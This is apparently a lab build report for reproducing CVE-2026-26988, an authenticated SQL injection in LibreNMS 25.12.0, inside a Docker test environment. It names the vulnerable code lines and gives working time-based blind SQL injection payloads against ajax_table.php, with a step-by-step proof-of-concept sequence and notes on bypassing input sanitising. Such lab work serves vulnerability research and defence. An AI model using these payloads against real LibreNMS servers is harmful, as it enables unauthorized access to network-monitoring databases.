# Lab Build Report: CVE-2026-26988

## Lab Architecture

Multi-container Docker Compose lab using the official LibreNMS Docker image for the vulnerable application, with MariaDB and Redis as supporting services.

```
┌─────────────────────────────────────────────────────────────────┐
│                        Docker Compose                           │
│                                                                 │
│  ┌──────────────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ cve-2026-26988-      │  │ cve-2026-   │  │ cve-2026-     │  │
│  │ vulnerable           │  │ 26988-db    │  │ 26988-redis   │  │
│  │                      │  │             │  │               │  │
│  │ librenms/librenms:   │  │ mariadb:    │  │ redis:7.2-    │  │
│  │ 25.12.0              │  │ 10.11       │  │ alpine        │  │
│  │                      │  │             │  │               │  │
│  │ nginx + php-fpm 8.3  │  │ MySQL 3306  │  │ Redis 6379    │  │
│  │ Web UI :8000         │  │             │  │               │  │
│  └──────────┬───────────┘  └──────┬──────┘  └───────┬───────┘  │
│             │       lab-net       │                  │          │
│             └─────────────────────┴──────────────────┘          │
│             │                                                   │
│             │                                                   │
│             └─────────────────────────────────────────────────── │
└─────────────────────────────────────────────────────────────────┘
```

### Container Details

| Container | Image | Role | Networks | Key Ports |
|-----------|-------|------|----------|-----------|
| `cve-2026-26988-vulnerable` | `librenms/librenms:25.12.0` | Vulnerable LibreNMS application | `lab-net` | 8000 (HTTP) |
| `cve-2026-26988-db` | `mariadb:10.11` | MySQL database backend | `lab-net` | 3306 (internal) |
| `cve-2026-26988-redis` | `redis:7.2-alpine` | Cache/session store | `lab-net` | 6379 (internal) |

### Network Configuration

- **lab-net**: Internal bridge network for inter-service communication
- Port mapping: `8000:8000` (accessible via `localhost:8000`)

---

## Build Status

| Container | Status | Health | Notes |
|-----------|--------|--------|-------|
| `cve-2026-26988-db` | ✅ Running | Healthy | MariaDB initialized with `librenms` database |
| `cve-2026-26988-redis` | ✅ Running | Healthy | Redis responding to PING |
| `cve-2026-26988-vulnerable` | ✅ Running | Running | LibreNMS web UI serving on port 8000 |

No build workarounds were needed — the official Docker image `librenms/librenms:25.12.0` provides the exact vulnerable version out of the box.

---

## Start/Stop Commands

```bash
# Start the lab
docker compose -f lab/docker-compose.yml up -d

# Run initialization (admin user, test data) — only needed on first start
bash lab/init-lab.sh

# Stop the lab
docker compose -f lab/docker-compose.yml down

# Full reset (removes volumes/data)
docker compose -f lab/docker-compose.yml down -v

# Get container IP
docker inspect cve-2026-26988-vulnerable --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'
```

---

## Lab Initialization

The `init-lab.sh` script performs:

1. **Waits for LibreNMS web UI** to respond (up to 120 seconds)
2. **Removes install wizard marker** — prevents redirect to setup page
3. **Sets APP_URL** to container IP for correct URL generation
4. **Clears Laravel cache** — ensures config changes take effect
5. **Creates admin user**: `admin` / `Cvelab2026!sqli` (email: `admin@lab.local`)
6. **Seeds test data**:
   - Device: `lab-router` (device_id=1)
   - Port: `eth0` (port_id=1)
   - IPv6 address: `2001:db8::1/64` (for SLEEP-per-row behavior)
   - IPv4 address: `10.0.0.1/24` (for SLEEP-per-row behavior)

### Credentials

| Field | Value |
|-------|-------|
| **Admin Username** | `admin` |
| **Admin Password** | `Cvelab2026!sqli` |
| **Admin Email** | `admin@lab.local` |
| **DB User** | `librenms` |
| **DB Password** | `librenms_pass` |
| **DB Root Password** | `rootpass` |
| **DB Name** | `librenms` |

---

## Verification Evidence

### 1. Web UI Accessible

```
HTTP 200 from http://<container_ip>:8000/login (response time: 0.008s)
```

### 2. Vulnerable File Present

```
/opt/librenms/includes/html/table/address-search.inc.php — PRESENT
PHP 8.3.27, LibreNMS 25.12.0
```

Confirmed injection points:
- **Line 34** (IPv4): `$sql .= " AND ipv4_prefixlen='$prefix'";`
- **Line 52** (IPv6): `$sql .= " AND ipv6_prefixlen = '$prefix'";`

### 3. SQL Injection Confirmed — Time-Based Blind

**IPv6 path** (`search_type=ipv6`):
```
Payload: address=::1/1' OR SLEEP(3)-- -
Response time: 6.02s (SLEEP(3) fires ×2: once for COUNT, once for SELECT)
Control (no injection): 0.02s
```

**IPv4 path** (`search_type=ipv4`):
```
Payload: address=1/1' OR SLEEP(3)-- -
Response time: 6.03s (SLEEP(3) fires ×2)
```

> **Note on IPv4 timing**: When the CIDR prefix in the payload matches an existing row's actual prefix (e.g., `24` matches the seeded row with prefix 24), MySQL short-circuits the `OR SLEEP()` clause. Use a non-matching prefix value (e.g., `1`) to ensure the SLEEP fires.

### 4. Authentication Enforcement Confirmed

```
Unauthenticated request to /ajax_table.php: Response = "Unauthorized"
```

Authentication is required (valid session cookie). No CSRF token is needed for `ajax_table.php`.

---

## Accessing the Lab

### Accessing the Lab

```bash
# Get container IP
CONTAINER_IP=$(docker inspect cve-2026-26988-vulnerable --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

# Access web UI
curl "http://${CONTAINER_IP}:8000/login"

# Use docker exec for commands inside the container
docker exec cve-2026-26988-vulnerable php /opt/librenms/artisan --version
```

### PoC Execution Quick Reference

```python
# 1. GET /login → extract _token from hidden input
# 2. POST /login with _token, username=admin, password=Cvelab2026!sqli → get session cookie
# 3. POST /ajax_table.php with:
#    id=address-search
#    search_type=ipv6
#    address=::1/1' OR SLEEP(3)-- -
#    current=1
#    rowCount=10
# 4. Measure response time — ≥3s confirms SQLi
```

---

## Known Issues & Notes

1. **Container IP is dynamic** — use `docker inspect` to get the current IP after restart
2. **First startup takes ~30-60s** — LibreNMS runs database migrations on first boot
3. **SLEEP fires per-row per-query** — total delay = `SLEEP_VALUE × rows × 2` (COUNT + SELECT). With 1 seeded row, SLEEP(3) → ~6s delay
4. **POST required** — GET parameters are sanitized with `strip_tags()` in `vars.inc.php`; POST values pass through unsanitized
5. **MAC search path is NOT vulnerable** — only IPv4 and IPv6 paths have the injection
6. **Session cookie name** — `laravel_session` (standard Laravel)
7. **No CSRF token needed** for `ajax_table.php` — legacy endpoint bypasses Laravel CSRF middleware

---

## Lab Files

| File | Path | Purpose |
|------|------|---------|
| `docker-compose.yml` | `lab/docker-compose.yml` | Container orchestration |
| `init-lab.sh` | `lab/init-lab.sh` | Post-startup initialization |
